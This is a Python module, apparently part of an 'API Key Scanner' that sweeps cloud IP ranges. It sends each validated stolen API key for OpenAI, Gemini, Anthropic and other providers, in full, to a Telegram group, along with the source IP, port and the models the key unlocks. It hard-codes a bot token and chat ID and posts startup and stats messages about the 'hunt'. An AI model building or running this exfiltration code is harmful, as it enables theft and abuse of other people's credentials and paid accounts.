"""
Telegram notifier — pushes discovered API keys to a Telegram group instantly.
Uses bot API with proper rate limiting.
"""
import asyncio
import logging
from typing import Optional
import aiohttp

logger = logging.getLogger(__name__)

BOT_TOKEN = "8698804293:AAGO2c3O7tIqNmGS5Nkkc2RB2-0EVBoLfEs"
CHAT_ID = "-1003732431449"

API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


class TelegramNotifier:
    """Sends formatted API key notifications to Telegram."""

    def __init__(self, bot_token: str = BOT_TOKEN, chat_id: str = CHAT_ID):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_base = f"https://api.telegram.org/bot{bot_token}"
        self.session: Optional[aiohttp.ClientSession] = None
        self._rate_limiter = asyncio.Semaphore(5)  # Max 5 messages per second

    async def _get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session

    async def _send_message(self, text: str, parse_mode: str = "HTML") -> bool:
        """Send a raw message to the Telegram group."""
        async with self._rate_limiter:
            try:
                session = await self._get_session()
                async with session.post(
                    f"{self.api_base}/sendMessage",
                    json={
                        "chat_id": self.chat_id,
                        "text": text,
                        "parse_mode": parse_mode,
                        "disable_web_page_preview": True,
                    },
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status != 200:
                        body = await resp.text()
                        logger.warning(f"Telegram send failed: {resp.status} - {body}")
                        return False
                    return True
            except Exception as e:
                logger.error(f"Telegram send error: {e}")
                return False

    async def notify_key_found(self, provider: str, key: str, ip: str, port: int,
                                endpoint: str, models: list[str] = None,
                                validated: bool = True) -> bool:
        """
        Send a formatted key discovery notification.
        Matches the style from LO's friend's messages.
        """
        # Mask middle of key for privacy in preview, show full in code block
        key_preview = key[:20] + "..." + key[-10:] if len(key) > 35 else key[:15] + "..." + key[-5:]

        models_str = ""
        if models:
            model_list = "\n".join(models[:10])  # Show first 10
            remaining = len(models) - 10
            models_str = f"{model_list}\n{'... +' + str(remaining) + ' more' if remaining > 0 else ''}"

        validation_star = "✅" if validated else "❌"

        text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 KEY FOUND — {provider}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏷 Provider: {provider}\n"
            f"🔐 Key: <code>{key}</code>\n"
            f"🌐 Source: http://{ip}:{port}{endpoint}\n"
            f"✓ Validated: {validation_star}\n"
        )

        if models_str:
            text += f"🤖 Models ({len(models) if models else 0}):\n{models_str}\n"

        text += "━━━━━━━━━━━━━━━━━━━━━━\n"

        return await self._send_message(text)

    async def notify_startup(self, version: str = "1.0.0") -> bool:
        """Send a startup notification."""
        text = (
            f"🚀 <b>API Key Scanner v{version}</b>\n"
            f"📡 Scanning started — targeting cloud IP ranges\n"
            f"🔍 Hunting: OpenAI · Gemini · OpenRouter · DeepSeek · Anthropic · and more\n"
            f"⚡ Only validated keys will be reported\n"
        )
        return await self._send_message(text)

    async def notify_stats(self, ips_scanned: int, keys_found: int, keys_valid: int,
                            elapsed_hours: float) -> bool:
        """Send periodic stats update."""
        text = (
            f"📊 <b>Scan Stats</b>\n"
            f"├ IPs Scanned: {ips_scanned:,}\n"
            f"├ Keys Found: {keys_found}\n"
            f"├ Valid Keys: {keys_valid}\n"
            f"└ Runtime: {elapsed_hours:.1f}h\n"
            f"Rate: {ips_scanned / max(elapsed_hours * 3600, 1):.0f} IPs/sec"
        )
        return await self._send_message(text)

    async def notify_error(self, error_msg: str) -> bool:
        """Send an error notification."""
        text = f"⚠️ <b>Scanner Error</b>\n<code>{error_msg[:200]}</code>"
        return await self._send_message(text)

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
